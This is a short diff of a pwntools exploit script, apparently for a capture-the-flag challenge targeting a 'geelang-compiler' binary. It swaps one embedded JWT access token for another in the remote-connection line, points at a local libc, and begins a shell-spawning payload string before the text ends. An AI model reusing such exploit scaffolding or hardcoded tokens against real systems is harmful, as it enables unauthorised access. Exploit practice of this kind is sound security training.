@@ -3,12 +3,12 @@ from pwn import *
 PROGNAME   = "./geelang-compiler"
 
 if args.REMOTE:
-    p = process(["./cli-relay", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFiQGdlZWdsZS5vcmciLCJzZXJ2aWNlIjoidWJlcnByb3h5QHNlcnZpY2VzLmdlZWdsZS5vcmciLCJleHAiOjE1NzQ1ODE3NjR9.Q4IVZ28t9s73-E7Lwr42GsbpXi4bqJF9MpVTkKJrllU", "geelang.corp.geegle.org"])
+    p = process(["./cli-relay", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3RhZGFtMkBnZWVnbGUub3JnIiwic2VydmljZSI6InViZXJwcm94eUBzZXJ2aWNlcy5nZWVnbGUub3JnIiwiZXhwIjoxNTc1MDIxMzAzfQ.0moQaXuHvpM2HfwfV9U9zNdmXkX_iEw_hd5fRIA3-yM", "geelang.corp.geegle.org"])
     elf = ELF(PROGNAME)
 else:
     p = process(PROGNAME)
     elf = p.elf
-libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+libc = ELF("./libc.so.6")
 pause()
 GETSHELL = '''
 INT a 99
